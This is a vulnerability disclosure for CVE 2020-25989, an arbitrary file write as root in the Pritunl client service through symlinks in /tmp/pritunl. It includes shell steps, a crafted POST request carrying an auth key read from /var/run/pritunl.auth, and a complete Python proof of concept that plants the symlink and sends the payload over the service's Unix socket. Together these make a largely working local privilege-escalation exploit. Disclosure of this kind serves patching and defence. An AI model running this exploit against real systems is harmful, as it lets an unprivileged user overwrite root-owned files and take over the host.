# Arbitrary File Write in Pritunl (CVE 2020-25989)

## Vulnerability

Arbitrary file write as root in pritunl versions between 1.0.1116.6 and v1.2.2550.20. The pritunl-service writes to the following paths as root without checking if the file exists.

<ol>
<li>/tmp/pritunl/{profile_id}</li>
<li>/tmp/pritunl/{profile_id}-down.sh</li>
<li>/tmp/pritunl/{profile_id}-up.sh</li>
<li>/tmp/pritunl/{profile_id}-block.sh</li>
<li>/tmp/pritunl/{profile_id}.auth</li>
</ol>

the /tmp/pritunl/{profile_id}.auth path allows for fully controlled contents to be written to an arbitrary file on the host by placing a symlink in place of the file and submitting a malicious Profile POST request to the service with a crafted username and password. 

The following steps outline how to setup the test data.
```bash
touch /tmp/root_test
sudo chown 0600 /tmp/root_test
```
The following steps outline how to exploit the vulnerability.
```bash
mkdir /tmp/pritunl
ln -s /tmp/root_test /tmp/123467.auth
```
An attacker can then get the auth token required to interact with the service by reading 
```bash
/var/run/pritunl.auth
```
The following example post request is then used to exploit the vulnerability.
```
POST /profile HTTP/1.1
Auth-Key: Tp0JSp3iugTipiq2U9CpJcHuGkQGM3VvspS6gu6rtUfLCmOOlzl0gFkEFGiX67Zc
User-Agent: pritunl
Host: unix
accept: application/json
content-type: application/json
content-length: 286
Connection: close

{"id":"1234567","mode":"ovpn","org_id":"org_id_test","user_id":"user_id_test","server_id":"server_id_test","sync_token":"sync_token_test","sync_secret":"sync_secret_test","username":"username_test","password":"password_test","token_ttl":12345678,"reconnect":false,"timeout":false}
```

The strings "username_test" and "password_test" will be written to the file at the symlink (in this example that file is /tmp/root_test).

The contents of /tmp/root_test will now be.
```
username_test
password_test
```
These issues stem from the following functions in /service/Profile/Profile.go

<ol>
<li>write()</li>
<li>writeDown()</li>
<li>writeUp()</li>
<li>writeBlock()</li>
<li>writeAuth()</li>
</ol>
These functions call ioutil.WriteFile directly on the path that is generated without first checking if these files exist, allowing an attacker to create a symlink at /tmp/pritunl/{file} allowing for arbitrary file write as root.

## PoC

Python PoC to interact with the pritunl-service and exploit the vulnerability 

```python
import socket
import os 

os.mkdir("/tmp/pritunl")
file_overwirte_path = "/tmp/root_test"
os.symlink(file_overwirte_path, "/tmp/pritunl/1234567.auth")

server_address = "/var/run/pritunl.sock"
auth = open("/var/run/pritunl.auth", "r").read()

payload = """POST /profile HTTP/1.1
Auth-Key: """ + auth + """
User-Agent: pritunl
Host: unix
accept: application/json
content-type: application/json
content-length: 286
Connection: close

{"id":"1234567","mode":"ovpn","org_id":"org_id_test","user_id":"user_id_test","server_id":"server_id_test","sync_token":"sync_token_test","sync_secret":"sync_secret_test","username":"root_file_write","password":"test","token_ttl":12345678,"reconnect":false,"timeout":false}
"""
sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
sock.connect(server_address)
sock.sendall(payload.encode('utf-8'))
```
